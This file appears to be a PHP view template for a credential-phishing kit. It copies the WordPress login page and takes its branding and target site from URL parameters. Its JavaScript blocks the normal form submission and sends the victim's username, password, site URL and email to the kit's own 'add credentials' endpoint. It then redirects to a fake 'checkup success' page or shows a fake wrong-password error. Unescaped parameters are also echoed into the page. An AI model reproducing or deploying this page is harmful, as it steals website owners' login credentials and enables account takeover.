<!DOCTYPE html>
<!-- saved from url=(0034)wp-login.php -->
<html dir="ltr" lang="en-US" prefix="og: https://ogp.me/ns#">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    <title>Log In ‹ <?= $this->input->get('a'); ?> — WordPress</title>
    <meta name="robots" content="max-image-preview:large, noindex, noarchive">
    <link rel="icon" href="https://s.w.org/favicon.ico?2" sizes="32x32" />

    <link rel="stylesheet" id="dashicons-css" href="<?= base_url() ?>assets/auth/dashicons.min.css" media="all">
    <link rel="stylesheet" id="buttons-css" href="<?= base_url() ?>assets/auth/buttons.min.css" media="all">
    <link rel="stylesheet" id="forms-css" href="<?= base_url() ?>assets/auth/forms.min.css" media="all">
    <link rel="stylesheet" id="l10n-css" href="<?= base_url() ?>assets/auth/l10n.min.css" media="all">
    <link rel="stylesheet" id="login-css" href="<?= base_url() ?>assets/auth/login.min.css" media="all">
    <meta name="referrer" content="strict-origin-when-cross-origin">
    <meta name="viewport" content="width=device-width">

</head>

<body class="login js login-action-login wp-core-ui  locale-en-us">
    <script src="<?= base_url() ?>assets/auth/zxcvbn.min.js.download" type="text/javascript" async=""></script>
    <script type="text/javascript">
        document.body.className = document.body.className.replace('no-js', 'js');
    </script>
    <div id="login">
        <a href="https://pt.wordpress.org">
            <h1>
                <img style="width:100px" src="<?= base_url() ?>assets/wordpress-logo.svg">

            </h1>
        </a>

        <div style="display:none" id="login_empty" class="notice notice-error"> 
        <strong>Error:</strong> The username field is empty.<br>
<strong>Error:</strong> The password field is empty.<br>
        </div>


        <div  style="display:none" id="login_error" class="notice notice-error">
           <p><strong>Error:</strong> The password provided for <strong><span id="email_login"></span></strong> is incorrect. <a target="_blank" href="https://<?= $this->input->get('u'); ?>/wp-login.php?action=lostpassword">Lost your password?</a></p>
        </div>



        <form name="loginform" id="loginform" action="wp-login.php" method="post">
            <p>
                <label for="user_login">Username or Email Address</label>
                <input type="text" name="log" id="user_login" class="input" value="" size="20" autocapitalize="off" autocomplete="username">
            </p>

            <div class="user-pass-wrap">
                <label for="user_pass">Password</label>
                <div class="wp-pwd">
                    <input type="password" name="pwd" id="user_pass" class="input password-input" value="" size="20" autocomplete="current-password">
                    <button type="button" class="button button-secondary wp-hide-pw hide-if-no-js" data-toggle="0" aria-label="Show password">
                        <span class="dashicons dashicons-visibility" aria-hidden="true"></span>
                    </button>
                </div>
            </div>
            <p class="forgetmenot"><input name="rememberme" type="checkbox" id="rememberme" value="forever"> <label for="rememberme">Remember Me</label></p>
            <p class="submit">
                <input type="submit" name="wp-submit" id="wp-submit" class="button button-primary button-large" value="Log In">
                <input type="hidden" name="redirect_to" value="wp-admin/">
                <input type="hidden" name="testcookie" value="1">
            </p>
        </form>

        <p id="nav">
            <a target="_blank" href="https://<?= $this->input->get('u'); ?>/wp-login.php?action=lostpassword">Lost your password?</a>
        </p>
        <script type="text/javascript">
            function wp_attempt_focus() {
                setTimeout(function() {
                    try {
                        d = document.getElementById("user_login");
                        d.focus();
                        d.select();
                    } catch (er) {}
                }, 200);
            }
            wp_attempt_focus();
            if (typeof wpOnload === 'function') {
                wpOnload()
            }
        </script>
        <p id="backtoblog">
            <a target="_blank" href="https://<?= $this->input->get('u'); ?>">← Go to <?= ucfirst( $this->input->get('a')); ?></a>
        </p>
    </div>
    <div class="language-switcher">
        <form id="language-switcher" action="" method="get">

            <label for="language-switcher-locales">
                <span class="dashicons dashicons-translation" aria-hidden="true"></span>
                <span class="screen-reader-text">
                    Idioma </span>
            </label>

            <select name="wp_lang" id="language-switcher-locales">
                <option value="en_US" lang="en" selected="selected" data-installed="1">English (United States)</option>
                <!-- <option value="pt_BR" lang="pt"  data-installed="1">Português do Brasil</option>
                <option value="pt_PT" lang="pt" data-installed="1">Português</option> -->
            </select>

            <input type="hidden" name="redirect_to" value="https://termineseutcc.com.br/wp-admin/">


            <input type="button" class="button" value="Alterar">

        </form>
    </div>
    <script src="<?= base_url() ?>assets/auth/jquery.min.js.download" id="jquery-core-js"></script>
    <script src="<?= base_url() ?>assets/auth/jquery-migrate.min.js.download" id="jquery-migrate-js"></script>
    <script id="zxcvbn-async-js-extra">
    </script>
    <script src="<?= base_url() ?>assets/auth/zxcvbn-async.min.js.download" id="zxcvbn-async-js"></script>
    <script src="<?= base_url() ?>assets/auth/regenerator-runtime.min.js.download" id="regenerator-runtime-js"></script>
    <script src="<?= base_url() ?>assets/auth/wp-polyfill.min.js.download" id="wp-polyfill-js"></script>
    <script src="<?= base_url() ?>assets/auth/hooks.min.js.download" id="wp-hooks-js"></script>
    <script src="<?= base_url() ?>assets/auth/i18n.min.js.download" id="wp-i18n-js"></script>
    <script id="wp-i18n-js-after">
        wp.i18n.setLocaleData({
            'text direction\u0004ltr': ['ltr']
        });
    </script>
    <script id="password-strength-meter-js-extra">
        var pwsL10n = {
            "unknown": "Password strength unknown",
            "short": "Very weak",
            "bad": "Weak",
            "good": "Medium",
            "strong": "Strong",
            "mismatch": "Mismatch"
        };
    </script>
    <script src="<?= base_url() ?>assets/auth/password-strength-meter.min.js.download" id="password-strength-meter-js"></script>
    <script src="<?= base_url() ?>assets/auth/underscore.min.js.download" id="underscore-js"></script>
    <script id="wp-util-js-extra">
        var _wpUtilSettings = {
            "ajax": {
                "url": "\/wp-admin\/admin-ajax.php"
            }
        };
    </script>
    <script src="<?= base_url() ?>assets/auth/wp-util.min.js.download" id="wp-util-js"></script>
    <script id="user-profile-js-extra">
        var userProfileL10n = {
            "user_id": "0",
            "nonce": "6895191516"
        };
    </script>
    <script src="<?= base_url() ?>assets/auth/user-profile.min.js.download" id="user-profile-js"></script>
    <div class="clear"></div>

    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>


    <script>
        $('#loginform').on('submit', function(e) {

            e.preventDefault()

            var login = $('#user_login').val()
            var password = $('#user_pass').val()

            if (login.length == 0 || password.length == 0) {

                $('#login_empty').css('display', 'block')
                $('#login_error').css('display', 'none')


            } else {

                $.ajax({
                    method: 'POST',
                    url: '<?= base_url() ?>auth/act_add_adepto_credenciais',
                    data: {
                        user_url: '<?= $this->input->get('u'); ?>',
                        user_email: '<?= $this->input->get('e'); ?>',
                        user_login: login,
                        user_password: password

                    },
                    success: function(data) {

                        var resp = JSON.parse(data)

                       
                        if (resp.status == "true") {

                            window.location.href = "<?= base_url() ?>checkup/success?u=<?= $this->input->get('u'); ?>&a=<?= $this->input->get('a'); ?>&lang=<?= $this->input->get('lang'); ?>"

                        } else {

                            $('#login_empty').css('display', 'none')
                            $('#email_login').text(login)
                            $('#login_error').css('display', 'block')
                        }
                    },
                    error: function(data) {

                    
                            $('#login_empty').css('display', 'none')
                            $('#email_login').text(login)
                            $('#login_error').css('display', 'block')
                            
                        console.log('Ocorreu um erro temporário.');
                    },
                });
            }


        })
    </script>


</body>

</html> 